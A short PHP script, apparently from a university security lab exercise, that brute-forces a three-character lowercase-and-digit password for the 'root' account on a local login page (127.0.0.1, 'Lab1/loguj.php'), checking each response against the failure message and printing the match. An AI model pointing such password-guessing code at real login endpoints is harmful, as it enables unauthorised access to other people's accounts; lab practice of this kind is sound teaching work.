<?php
$tablicaznakow=array();
/*for($i=65;$i<=90;$i++)
{
  $tablicaznakow[]=chr($i);
}
*/
for($i=97;$i<=122;$i++)
{
  $tablicaznakow[]=chr($i);
}
for($i=0;$i<=9;$i++)
{
  $tablicaznakow[]=$i;
}


for($i=0;$i<count($tablicaznakow);$i++)
{
  for($j=0;$j<count($tablicaznakow);$j++)
  {
    for($k=0;$k<count($tablicaznakow);$k++)
    {

        $haslo=$tablicaznakow[$i]."".$tablicaznakow[$j]."".$tablicaznakow[$k];
        $adres="http://127.0.0.1/biod%20/Lab1/loguj.php?login=root&haslo=".$haslo;
        $dom = file_get_contents($adres);
        echo($haslo);
        echo("<br>");
        if(strcmp($dom,"<p>Haslo lub login niepoprawne</p>")!=0)
        {
          echo("Hasło to : $haslo");
          break 3;
        }

    }
  }
}
?>
